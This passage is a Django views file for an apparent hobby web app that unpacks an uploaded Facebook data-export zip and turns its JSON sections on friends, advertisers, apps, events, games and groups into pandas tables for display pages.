import base64
import io

from django.shortcuts import render, redirect
from django.http import HttpResponse

from django.contrib.auth.forms import UserCreationForm
from django.contrib import messages
from django.views.generic import TemplateView
from django.core.files.storage import FileSystemStorage

import zipfile
import time
import os
import datetime
import json
import pandas as pd
import numpy as np
import seaborn as sns

from matplotlib import pyplot
import matplotlib.pyplot as plt
from datetime import date, datetime

import email_to
import email
import smtplib
import os
from email.message import EmailMessage
from email.mime.text import MIMEText
from email.mime.multipart import *
import datetime
import csv
import glob
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import csv


# Create your views here.

# def index(request):
#     return HttpResponse('<h1>hello world</h1>')

def index(request):
    """
    Landing page of the web app ,
    where user will login / register

    """
    return HttpResponse('<h1>You have Landed on index page</h1>')


def pre_home(request):
    """
    After successful login of user
    user will upload the json file here
    """

    context = {}
    if request.method == 'POST':
        uploaded_file = request.FILES['fb_json_document']
        print(uploaded_file.name)
        print(uploaded_file.size)
        xl = uploaded_file.name
        fs = FileSystemStorage()
        name = fs.save(uploaded_file.name, uploaded_file)
        context['url'] = fs.url(name)

        x = date.fromtimestamp(time.time())
        z = 'D:/webapp/project/media/{}'.format(xl)
        target = z
        root = zipfile.ZipFile(target)
        y = 'D:/webapp/project/media/facebook_{}/'.format(x)
        root.extractall(y)
        root.close()

        main_list = os.listdir(y)
        base_url = y + main_list[0]

        grp_name = []
        arr = os.listdir(base_url)
        grp_name.append(arr)

        sep_url = []
        for i in range(0, len(grp_name[0])):
            # print("loop={}".format(i))
            sep_url.append(base_url + "/" + grp_name[0][i])

        print("(main)list")
        print(main_list)
        print("(main)list[0]")
        print(main_list[0])
        print("=======")
        print("len(main_list)")
        print(len(main_list))
        print("base_url")
        print(base_url)

        # new
        today_time = date.fromtimestamp(time.time())
        csv_storing_name_path: str = 'D:/webapp/project/media/facebook_{}/profile_information'.format(today_time)

        path111: str = csv_storing_name_path + "/profile_information.json"
        print(csv_storing_name_path,uploaded_file.name)

        xx1 = open(path111)
        dd1 = json.load(xx1)
        csv_folder_name = str(dd1['profile_v2']['name']["full_name"])

        newpath = r'D:/webapp/project/media/csv/' + csv_folder_name
        if not os.path.exists(newpath):
            os.makedirs(newpath)

        return redirect('/home')

    return render(request, 'app/pre_home.html', context)


def home(request):
    """
    After uploading the file the user will be re-directed to this page
    where the user will see multiple links for visualization
    """
    context = {}
    return render(request, 'app/home.html', context)


def activity_messages(request):
    """
    data visualization of groups / friends

    activity_messages/group_interactions

    """

    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    current_date = date.fromtimestamp(time.time())
    activity_messages_path = 'D:/webapp/project/media/facebook_{}/activity_messages'.format(current_date)

    """
    arr = os.listdir(activity_messages_path)
    print(arr)
    print("arr[0]")
    print(arr[0])
    print("arr[1]")
    print(arr[1])
    """

    """
    path1: str = activity_messages_path + "/group_interactions.json"

    x1 = open(path1)
    d1 = json.load(x1)

    name1 = []
    value1 = []
    uri1 = []

    for i in range(0, len(d1['group_interactions_v2'][0]['entries'])):
        name1.append(d1['group_interactions_v2'][0]['entries'][i]['data']['name'])
        value1.append(d1['group_interactions_v2'][0]['entries'][i]['data']['value'])
        uri1.append(d1['group_interactions_v2'][0]['entries'][i]['data']['uri'])

    dict1 = {'name': name1, 'value': value1, 'uri': uri1}
    df1 = pd.DataFrame(dict1)

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df = pd.read_csv(path1_csv)

    for i in range(0, len(df['value'])):
        df['value'][i] = df['value'][i].split(" ")[0]

    name_lst = df['name'].tolist()
    name = name_lst

    value_lst = df['value'].tolist()
    value = value_lst

    context = {'name': name, 'value': value}
    # context = {}
    """

    path1: str = activity_messages_path + "/group_interactions.json"

    x1 = open(path1)
    d1 = json.load(x1)

    name1 = []
    value1 = []
    uri1 = []

    for i in range(0, len(d1['group_interactions_v2'][0]['entries'])):
        name1.append(d1['group_interactions_v2'][0]['entries'][i]['data']['name'])
        value1.append(d1['group_interactions_v2'][0]['entries'][i]['data']['value'])
        uri1.append(d1['group_interactions_v2'][0]['entries'][i]['data']['uri'])

    dict1 = {'name': name1, 'value': value1, 'uri': uri1}
    df1 = pd.DataFrame(dict1)

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df1 = pd.read_csv(path1_csv)

    for i in range(0, len(df1['value'])):
        df1['value'][i] = df1['value'][i].split(" ")[0]

    name_lst1 = df1['name'].tolist()
    value_lst1 = df1['value'].tolist()

    allData1 = []
    for i in range(df1.shape[0]):
        temp1 = df1.iloc[i]
        allData1.append(dict(temp1))

    context = {'name': name_lst1, 'value': value_lst1, "allData1": allData1}

    return render(request, 'app/activity_messages.html', context)


def graph2(request):
    """
    data visualization of groups / friends
    """
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    current_date = date.fromtimestamp(time.time())
    activity_messages_path = 'D:/webapp/project/media/facebook_{}/friends_and_followers'.format(current_date)

    print("activity_messages_path")
    print(activity_messages_path)

    # arr = os.listdir(activity_messages_path)
    # print(arr)
    # print("arr[0]")
    # print(arr[0])
    # print("arr[1]")
    # print(arr[1])

    path1 = activity_messages_path + "/friend_requests_sent.json"

    x1 = open(path1)
    d1 = json.load(x1)

    name = []
    timestamp = []

    for i in range(0, len(d1['sent_requests_v2'])):
        print(d1['sent_requests_v2'][i])
        name.append(d1['sent_requests_v2'][i]['name'])
        timestamp.append(d1['sent_requests_v2'][i]['timestamp'])

    dictn = {'name': name, 'timestamp': timestamp}
    dataframe = pd.DataFrame(dictn)

    from datetime import datetime

    date = []
    time = []
    for i in range(0, len(dataframe['timestamp'])):
        print(datetime.fromtimestamp(int(dataframe['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S'))
        date.append(datetime.fromtimestamp(int(dataframe['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time.append(datetime.fromtimestamp(int(dataframe['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    dataframe['date'] = date
    dataframe['time'] = time

    path1_csv = path1[:-4] + 'csv'

    dataframe.to_csv(path1_csv)

    df = pd.read_csv(path1_csv)

    name_lst = df['name'].tolist()
    date_lst = df['date'].tolist()
    time_lst = df['time'].tolist()

    allData = []
    for i in range(df.shape[0]):
        temp = df.iloc[i]
        allData.append(dict(temp))

    context = {'name_lst': name_lst, 'date_lst': date_lst, 'time_lst': time_lst, 'data': allData}
    # context = {}
    return render(request, 'app/graph2.html', context)


def register(request):
    form = UserCreationForm
    if request.method == 'POST':
        regForm = UserCreationForm(request.POST)
        if regForm.is_valid():
            regForm.save()
            messages.success(request, 'User has been registered')
    return render(request, 'app/register.html', {'form': form})


def friends_and_followers(request):
    """
    # def friends_and_followers_graph2_has_OneFromTHeList(request):
    # def friends_and_followers(request):
    ['friends.json', 'friends_you_see_less.json',
     'friend_requests_sent.json', 'people_who_follow_you.json',
      'rejected_friend_requests.json',
       'removed_friends.json', 'who_you_follow.json']
    """

    # importing libraries
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    today_time = date.fromtimestamp(time.time())
    friends_and_followers_path: str = 'D:/webapp/project/media/facebook_{}/friends_and_followers'.format(today_time)

    """ 
    arr = os.listdir(friends_and_followers_path)
    print(arr)
    print("arr[0]")
    print(arr[0])
    print("arr[1]")
    print(arr[1])
    print(arr[2])
    print(arr[-1])
    """

    """
    friends.json
    """

    path1: str = friends_and_followers_path + "/friends.json"

    x1 = open(path1)
    d1 = json.load(x1)

    name1 = []
    timestamp1 = []

    for i in range(0, len(d1['friends_v2'])):
        name1.append(d1['friends_v2'][i]['name'])
        timestamp1.append(d1['friends_v2'][i]['timestamp'])

    dict1 = {'name': name1, 'timestamp': timestamp1}
    df1 = pd.DataFrame(dict1)

    from datetime import datetime

    date1 = []
    time1 = []
    for i in range(0, len(df1['timestamp'])):
        date1.append(datetime.fromtimestamp(int(df1['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time1.append(datetime.fromtimestamp(int(df1['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df1['date'] = date1
    df1['time'] = time1

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df_1 = pd.read_csv(path1_csv)

    name_lst1 = df_1['name'].tolist()
    date_lst1 = df_1['date'].tolist()
    time_lst1 = df_1['time'].tolist()

    allData1 = []
    for i in range(df_1.shape[0]):
        temp = df_1.iloc[i]
        allData1.append(dict(temp))

    """
    friends_you_see_less.json
    """

    path2: str = friends_and_followers_path + "/friends_you_see_less.json"

    x2 = open(path2)
    d2 = json.load(x2)

    timestamp2 = []
    name2 = []
    uri2 = []

    for i in range(0, len(d2['friends_you_see_less_v2'])):
        print(d2['friends_you_see_less_v2'][i]['entries'][i])
        timestamp2.append(d2['friends_you_see_less_v2'][i]['entries'][i]['timestamp'])
        name2.append(d2['friends_you_see_less_v2'][i]['entries'][i]['data']['name'])
        uri2.append(d2['friends_you_see_less_v2'][i]['entries'][i]['data']['uri'])

    dict2 = {'timestamp': timestamp2, 'name': name2, 'uri': uri2}
    df2 = pd.DataFrame(dict2)

    from datetime import datetime

    date2 = []
    time2 = []
    for i in range(0, len(df2['timestamp'])):
        print(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S'))
        date2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df2['date'] = date2
    df2['time'] = time2

    path2_csv = path2[:-4] + 'csv'

    df2.to_csv(path2_csv)

    df_2 = pd.read_csv(path2_csv)

    name_lst2 = df_2['name'].tolist()
    uri_lst2 = df_2['uri'].tolist()
    date_lst2 = df_2['date'].tolist()
    time_lst2 = df_2['time'].tolist()

    allData2 = []
    for i in range(df_2.shape[0]):
        temp2 = df_2.iloc[i]
        allData2.append(dict(temp2))

    """
    friend_requests_sent.json
    """

    path3: str = friends_and_followers_path + "/friend_requests_sent.json"

    x3 = open(path3)
    d3 = json.load(x3)

    name3 = []
    timestamp3 = []

    for i in range(0, len(d3['sent_requests_v2'])):
        name3.append(d3['sent_requests_v2'][i]['name'])
        timestamp3.append(d3['sent_requests_v2'][i]['timestamp'])

    dict3 = {'name': name3, 'timestamp': timestamp3}
    df3 = pd.DataFrame(dict3)

    from datetime import datetime

    date3 = []
    time3 = []
    for i in range(0, len(df3['timestamp'])):
        date3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df3['date'] = date3
    df3['time'] = time3

    name_lst3 = df3['name'].tolist()
    date_lst3 = df3['date'].tolist()
    time_lst3 = df3['time'].tolist()

    path3_csv = path3[:-4] + 'csv'

    df3.to_csv(path3_csv)

    df_3 = pd.read_csv(path3_csv)

    name_lst3 = df_3['name'].tolist()
    date_lst3 = df_3['date'].tolist()
    time_lst3 = df_3['time'].tolist()

    allData3 = []
    for i in range(df_3.shape[0]):
        temp3 = df_3.iloc[i]
        allData3.append(dict(temp3))

    """
    people_who_follow_you.json
    """

    path4: str = friends_and_followers_path + "/people_who_follow_you.json"

    x4 = open(path4)
    d4 = json.load(x4)

    name4 = []

    for i in range(0, len(d4['followers_v2'])):
        name4.append(d4['followers_v2'][i]['name'])

    dict4 = {'name': name4}
    df4 = pd.DataFrame(dict4)

    path4_csv = path4[:-4] + 'csv'

    df4.to_csv(path4_csv)

    df_4 = pd.read_csv(path4_csv)

    name_lst4 = df_4['name'].tolist()

    allData4 = []
    for i in range(df_4.shape[0]):
        temp4 = df_4.iloc[i]
        allData4.append(dict(temp4))

    """
    rejected_friend_requests.json
    """

    path5: str = friends_and_followers_path + "/rejected_friend_requests.json"

    x5 = open(path5)
    d5 = json.load(x5)

    name5 = []
    timestamp5 = []

    for i in range(0, len(d5['rejected_requests_v2'])):
        name5.append(d5['rejected_requests_v2'][i]['name'])
        timestamp5.append(d5['rejected_requests_v2'][i]['timestamp'])

    dict5 = {'name': name5, 'timestamp': timestamp5}
    df5 = pd.DataFrame(dict5)

    from datetime import datetime

    date5 = []
    time5 = []
    for i in range(0, len(df5['timestamp'])):
        date5.append(datetime.fromtimestamp(int(df5['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time5.append(datetime.fromtimestamp(int(df5['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df5['date'] = date5
    df5['time'] = time5

    path5_csv = path5[:-4] + 'csv'

    df5.to_csv(path5_csv)

    df_5 = pd.read_csv(path5_csv)

    name_lst5 = df_5['name'].tolist()
    date_lst5 = df_5['date'].tolist()
    time_lst5 = df_5['time'].tolist()

    allData5 = []
    for i in range(df_5.shape[0]):
        temp5 = df_5.iloc[i]
        allData5.append(dict(temp5))

    """
    removed_friends.json
    """

    path6: str = friends_and_followers_path + "/removed_friends.json"

    x6 = open(path6)
    d6 = json.load(x6)

    name6 = []
    timestamp6 = []

    for i in range(0, len(d6['deleted_friends_v2'])):
        name6.append(d6['deleted_friends_v2'][i]['name'])
        timestamp6.append(d6['deleted_friends_v2'][i]['timestamp'])

    dict6 = {'name': name6, 'timestamp': timestamp6}
    df6 = pd.DataFrame(dict6)

    from datetime import datetime

    date6 = []
    time6 = []
    for i in range(0, len(df6['timestamp'])):
        date6.append(datetime.fromtimestamp(int(df6['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time6.append(datetime.fromtimestamp(int(df6['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df6['date'] = date6
    df6['time'] = time6

    path6_csv = path6[:-4] + 'csv'

    df6.to_csv(path6_csv)

    df_6 = pd.read_csv(path6_csv)

    name_lst6 = df_6['name'].tolist()
    date_lst6 = df_6['date'].tolist()
    time_lst6 = df_6['time'].tolist()

    allData6 = []
    for i in range(df_6.shape[0]):
        temp6 = df_6.iloc[i]
        allData6.append(dict(temp6))

    """
    who_you_follow.json
    """

    path7: str = friends_and_followers_path + "/who_you_follow.json"

    x7 = open(path7)
    d7 = json.load(x7)

    name7 = []
    timestamp7 = []

    for i in range(0, len(d7['following_v2'])):
        name7.append(d7['following_v2'][i]['name'])
        timestamp7.append(d7['following_v2'][i]['timestamp'])

    dict7 = {'name': name7, 'timestamp': timestamp7}
    df7 = pd.DataFrame(dict7)

    from datetime import datetime

    date7 = []
    time7 = []
    for i in range(0, len(df7['timestamp'])):
        date7.append(datetime.fromtimestamp(int(df7['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time7.append(datetime.fromtimestamp(int(df7['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df7['date'] = date7
    df7['time'] = time7

    path7_csv = path7[:-4] + 'csv'

    df7.to_csv(path7_csv)

    df_7 = pd.read_csv(path7_csv)

    name_lst7 = df_7['name'].tolist()
    date_lst7 = df_7['date'].tolist()
    time_lst7 = df_7['time'].tolist()

    allData7 = []
    for i in range(df_7.shape[0]):
        temp7 = df_7.iloc[i]
        allData7.append(dict(temp7))

    context = {"allData1": allData1, "allData2": allData2, "allData3": allData3, "allData4": allData4,
               "allData5": allData5, "allData6": allData6, "allData7": allData7}

    return render(request, 'app/friends_and_followers.html', context)


def ads_information(request):
    """
    ['advertisers_using_your_activity_or_information.json', "advertisers_you've_interacted_with.json",
    "information_you've_submitted_to_advertisers.json"]
    """
    # importing libraries
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    today_time = date.fromtimestamp(time.time())
    ads_information_path: str = 'D:/webapp/project/media/facebook_{}/ads_information'.format(today_time)

    """
    advertisers_using_your_activity_or_information
    """

    path1: str = ads_information_path + "/advertisers_using_your_activity_or_information.json"

    x1 = open(path1)
    d1 = json.load(x1)

    advertiser_name1 = []
    has_data_file_custom_audience1 = []
    has_remarketing_custom_audience1 = []
    has_in_person_store_visit1 = []

    for i in range(0, len(d1['custom_audiences_all_types_v2'])):
        advertiser_name1.append(d1['custom_audiences_all_types_v2'][i]['advertiser_name'])
        has_data_file_custom_audience1.append(d1['custom_audiences_all_types_v2'][i]['has_data_file_custom_audience'])
        has_remarketing_custom_audience1.append(
            d1['custom_audiences_all_types_v2'][i]['has_remarketing_custom_audience'])
        has_in_person_store_visit1.append(d1['custom_audiences_all_types_v2'][i]['has_in_person_store_visit'])

    dict1 = {'advertiser_name': advertiser_name1, 'has_data_file_custom_audience': has_data_file_custom_audience1,
             'has_remarketing_custom_audience': has_remarketing_custom_audience1,
             'has_in_person_store_visit': has_in_person_store_visit1}

    df1 = pd.DataFrame(dict1)

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df_1 = pd.read_csv(path1_csv)

    # advertiser_name1 = df_1['advertiser_name'].tolist()
    advertiser_name1 = df_1['advertiser_name']

    """
    advertisers_you've_interacted_with
    """

    path2: str = ads_information_path + "/advertisers_you've_interacted_with.json"

    x2 = open(path2)
    d2 = json.load(x2)

    title2 = []
    action2 = []
    timestamp2 = []

    for i in range(0, len(d2['history_v2'])):
        title2.append(d2['history_v2'][i]['title'])
        action2.append(d2['history_v2'][i]['action'])
        timestamp2.append(d2['history_v2'][i]['timestamp'])

    dict2 = {'title': title2, 'action': action2, 'timestamp': timestamp2}
    df2 = pd.DataFrame(dict2)

    from datetime import datetime

    date2 = []
    time2 = []
    for i in range(0, len(df2['timestamp'])):
        date2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df2['date'] = date2
    df2['time'] = time2

    path2_csv = path2[:-4] + 'csv'

    df2.to_csv(path2_csv)

    df_2 = pd.read_csv(path2_csv)

    name_lst2 = df_2['title'].tolist()
    date_lst2 = df_2['date'].tolist()
    time_lst2 = df_2['time'].tolist()

    allData2 = []
    for i in range(df_2.shape[0]):
        temp2 = df_2.iloc[i]
        allData2.append(dict(temp2))

    """
    information_you've_submitted_to_advertisers
    """

    path3: str = ads_information_path + "/information_you've_submitted_to_advertisers.json"

    x3 = open(path3)
    d3 = json.load(x3)

    label3 = []
    value3 = []

    for i in range(0, len(d3['lead_gen_info_v2'])):
        label3.append(d3['lead_gen_info_v2'][i]['label'])
        value3.append(d3['lead_gen_info_v2'][i]['value'])

    dict3 = {'label': label3, 'value': value3}

    df3 = pd.DataFrame(dict3)

    path3_csv = path3[:-4] + 'csv'

    df3.to_csv(path3_csv)

    df_3 = pd.read_csv(path3_csv)

    label3 = df_3['label'].tolist()
    value3 = df_3['value'].tolist()

    allData3 = []
    for i in range(df_3.shape[0]):
        temp3 = df_3.iloc[i]
        allData3.append(dict(temp3))

    context = {"df_1": df_1, "advertiser_name": advertiser_name1, "allData2": allData2, "allData3": allData3}

    return render(request, 'app/ads_information.html', context)


def apps_and_websites(request):
    """
    ['apps_and_websites.csv', 'apps_and_websites.json']
    """

    """
    apps_and_websites
    """

    # importing libraries
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    today_time = date.fromtimestamp(time.time())
    apps_and_websites_path: str = 'D:/webapp/project/media/facebook_{}/apps_and_websites_off_of_facebook'.format(
        today_time)

    path1: str = apps_and_websites_path + "/apps_and_websites.json"

    x1 = open(path1)
    d1 = json.load(x1)

    name1 = []
    added_timestamp1 = []
    user_app_scoped_id1 = []
    category1 = []
    removed_timestamp1 = []

    for i in range(0, len(d1['installed_apps_v2'])):
        name1.append(d1['installed_apps_v2'][i]['name'])
        added_timestamp1.append(d1['installed_apps_v2'][i]['added_timestamp'])
        user_app_scoped_id1.append(d1['installed_apps_v2'][i]['user_app_scoped_id'])
        category1.append(d1['installed_apps_v2'][i]['category'])
        removed_timestamp1.append(d1['installed_apps_v2'][i]['removed_timestamp'])

    dict1 = {'name': name1, 'added_timestamp': added_timestamp1,
             'user_app_scoped_id': user_app_scoped_id1, 'category': category1,
             'removed_timestamp': removed_timestamp1}
    df1 = pd.DataFrame(dict1)

    active1 = []
    inactive1 = []
    removed1 = []

    # for i in range(0, len(df1['name'])):
    #     if df1['category'][i] == "active":
    #         active1.append(df1.iloc[i])
    #     elif df1['category'][i] == "inactive":
    #         inactive1.append(df1.iloc[i])
    #     elif df1['category'][i] == "removed":
    #         removed1.append(df1.iloc[i])

    grouped = df1.groupby('category')

    active_group = grouped.get_group('active')
    inactive_group = grouped.get_group('inactive')
    removed_group = grouped.get_group('removed')

    allData1 = []
    for i in range(active_group.shape[0]):
        temp1 = active_group.iloc[i]
        allData1.append(dict(temp1))

    allData2 = []
    for i in range(inactive_group.shape[0]):
        temp2 = inactive_group.iloc[i]
        allData2.append(dict(temp2))

    allData3 = []
    for i in range(removed_group.shape[0]):
        temp3 = removed_group.iloc[i]
        allData3.append(dict(temp3))

    context = {"allData1": allData1, "allData2": allData2, "allData3": allData3}

    return render(request, 'app/apps_and_websites.html', context)


def comments_and_reactions(request):
    """
    ['comments.json', 'posts_and_comments.json']
    """
    # reaction cha smiley and count html madhe taka
    pass


def events(request):
    """
    ['event_invitations.json']
    """
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    """
    ['event_invitations']
    """

    current_date = date.fromtimestamp(time.time())
    event_invitations_path = 'D:/webapp/project/media/facebook_{}/events'.format(current_date)

    path1 = event_invitations_path + "/event_invitations.json"

    x1 = open(path1)
    d1 = json.load(x1)

    name1 = []
    start_timestamp1 = []
    end_timestamp1 = []

    for i in range(0, len(d1['events_invited_v2'])):
        name1.append(d1['events_invited_v2'][i]['name'])
        start_timestamp1.append(d1['events_invited_v2'][i]['start_timestamp'])
        end_timestamp1.append(d1['events_invited_v2'][i]['end_timestamp'])

    dict1 = {'name': name1, 'start_timestamp': start_timestamp1,
             'end_timestamp': end_timestamp1}
    df1 = pd.DataFrame(dict1)

    from datetime import datetime

    start_date1 = []
    start_time1 = []
    for i in range(0, len(df1['start_timestamp'])):
        start_date1.append(
            datetime.fromtimestamp(int(df1['start_timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        start_time1.append(
            datetime.fromtimestamp(int(df1['start_timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    end_date1 = []
    end_time1 = []
    for i in range(0, len(df1['end_timestamp'])):
        end_date1.append(
            datetime.fromtimestamp(int(df1['end_timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        end_time1.append(
            datetime.fromtimestamp(int(df1['end_timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df1['start_date'] = start_date1
    df1['start_time'] = start_time1
    df1['end_date'] = end_date1
    df1['end_time'] = end_time1

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df_1 = pd.read_csv(path1_csv)

    name_lst1 = df_1['name'].tolist()
    start_date_lst1 = df_1['start_date'].tolist()
    start_time_lst1 = df_1['start_time'].tolist()
    end_date_lst1 = df_1['end_date'].tolist()
    end_time_lst1 = df_1['end_time'].tolist()

    allData1 = []
    for i in range(df_1.shape[0]):
        temp = df_1.iloc[i]
        allData1.append(dict(temp))

    context = {"allData1": allData1}

    return render(request, 'app/events.html', context)


# yeh baki hai
def facebook_gaming(request):
    """
    ['instant_games.json']
    """
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    """
    ['instant_games']
    """

    current_date = date.fromtimestamp(time.time())
    facebook_gaming_path = 'D:/webapp/project/media/facebook_{}/facebook_gaming'.format(current_date)

    path1 = facebook_gaming_path + "/instant_games.json"

    x1 = open(path1)
    d1 = json.load(x1)

    name1 = []
    added_timestamp1 = []
    user_app_scoped_id1 = []
    category1 = []

    for i in range(0, len(d1['instant_games_played_v2'])):
        name1.append(d1['instant_games_played_v2'][i]['name'])
        added_timestamp1.append(d1['instant_games_played_v2'][i]['added_timestamp'])
        user_app_scoped_id1.append(d1['instant_games_played_v2'][i]['user_app_scoped_id'])
        category1.append(d1['instant_games_played_v2'][i]['category'])

    dict1 = {'name': name1, 'added_timestamp': added_timestamp1,
             'user_app_scoped_id': user_app_scoped_id1, 'category': category1}
    df1 = pd.DataFrame(dict1)

    from datetime import datetime
    added_date = []
    added_time = []

    for i in range(0, len(df1['added_timestamp'])):
        added_date.append(
            datetime.fromtimestamp(int(df1['added_timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        added_time.append(
            datetime.fromtimestamp(int(df1['added_timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df1['added_date'] = added_date
    df1['added_time'] = added_time

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df_1 = pd.read_csv(path1_csv)

    name_lst1 = df_1['name'].tolist()
    date_lst1 = df_1['added_date'].tolist()
    time_lst1 = df_1['added_time'].tolist()
    category_lst1 = df_1['category'].tolist()

    allData1 = []
    for i in range(df_1.shape[0]):
        temp = df_1.iloc[i]
        allData1.append(dict(temp))

    context = {"allData1": allData1}

    return render(request, 'app/facebook_gaming.html', context)


def facebook_payments(request):
    """
    ['payment_history.json']
    """
    # will see later
    pass


def groups(request):
    """
    ['creator_badges.json', 'your_comments_in_groups.json',
    'your_group_membership_activity.json', 'your_posts_in_groups.json']
    """
    # importing libraries
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    """
    creator_badges
    
    #We don't have enough data
    
    """
    today_time = date.fromtimestamp(time.time())
    groups_path: str = 'D:/webapp/project/media/facebook_{}/groups'.format(today_time)

    # path1: str = groups_path + "/creator_badges.json"
    #
    # x1 = open(path1)
    # d1 = json.load(x1)

    """
    your_comments_in_groups
    
    #no use for now
    """
    path2: str = groups_path + "/your_comments_in_groups.json"

    x2 = open(path2)
    d2 = json.load(x2)

    """
    your_group_membership_activity
    """
    path3: str = groups_path + "/your_group_membership_activity.json"

    x3 = open(path3)
    d3 = json.load(x3)

    timestamp3 = []
    title3 = []

    for i in range(0, len(d3["groups_joined_v2"])):
        timestamp3.append(d3["groups_joined_v2"][i]["timestamp"])
        title3.append(d3["groups_joined_v2"][i]["title"])

    dict3 = {'title': title3, 'timestamp': timestamp3}
    df3 = pd.DataFrame(dict3)

    from datetime import datetime
    date3 = []
    time3 = []

    for i in range(0, len(df3['timestamp'])):
        date3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df3['date'] = date3
    df3['time'] = time3

    path3_csv = path3[:-4] + 'csv'

    df3.to_csv(path3_csv)

    df_3 = pd.read_csv(path3_csv)

    title_lst3 = df_3['title'].tolist()
    date_lst3 = df_3['date'].tolist()
    time_lst3 = df_3['time'].tolist()

    allData3 = []
    for i in range(df_3.shape[0]):
        temp3 = df_3.iloc[i]
        allData3.append(dict(temp3))
    """
    your_posts_in_groups
    #no use for now
    """
    path4: str = groups_path + "/your_posts_in_groups.json"

    x4 = open(path4)
    d4 = json.load(x4)

    """
    temporary
    """
    current_date = date.fromtimestamp(time.time())
    activity_messages_path = 'D:/webapp/project/media/facebook_{}/activity_messages'.format(current_date)

    path1: str = activity_messages_path + "/group_interactions.json"

    x1 = open(path1)
    d1 = json.load(x1)

    name1 = []
    value1 = []
    uri1 = []

    for i in range(0, len(d1['group_interactions_v2'][0]['entries'])):
        name1.append(d1['group_interactions_v2'][0]['entries'][i]['data']['name'])
        value1.append(d1['group_interactions_v2'][0]['entries'][i]['data']['value'])
        uri1.append(d1['group_interactions_v2'][0]['entries'][i]['data']['uri'])

    dict1 = {'name': name1, 'value': value1, 'uri': uri1}
    df1 = pd.DataFrame(dict1)

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df1 = pd.read_csv(path1_csv)

    for i in range(0, len(df1['value'])):
        df1['value'][i] = df1['value'][i].split(" ")[0]

    name_lst1 = df1['name'].tolist()
    value_lst1 = df1['value'].tolist()

    allData1 = []
    for i in range(df1.shape[0]):
        temp1 = df1.iloc[i]
        allData1.append(dict(temp1))


    context = {"allData3": allData3, 'name': name_lst1, 'value': value_lst1, "allData1": allData1}

    return render(request, 'app/groups.html', context)


def messages_only(request):
    # Pay for this
    """
    ['autofill_information.json', 'inbox', 'message_requests', "messenger_contacts_you've_blocked.json",
    'previously_removed_contacts.json', 'secret_conversations.json', 'secret_groups.json', 'stickers_used',
    'support_messages.json']
    """

    # importing libraries
    global csv_path
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    """
    creating folder name as per file owner
    """
    today_time = date.fromtimestamp(time.time())
    csv_storing_name_path: str = 'D:/webapp/project/media/facebook_{}/profile_information'.format(today_time)

    path111: str = csv_storing_name_path + "/profile_information.json"

    xx1 = open(path111)
    dd1 = json.load(xx1)
    csv_folder_name = str(dd1['profile_v2']['name']["full_name"])
    csv_folder_name = str(csv_folder_name)

    newpath = r'D:/webapp/project/media/csv/' + csv_folder_name
    if not os.path.exists(newpath):
        os.makedirs(newpath)

    """
    inbox
    """

    today_time = date.fromtimestamp(time.time())
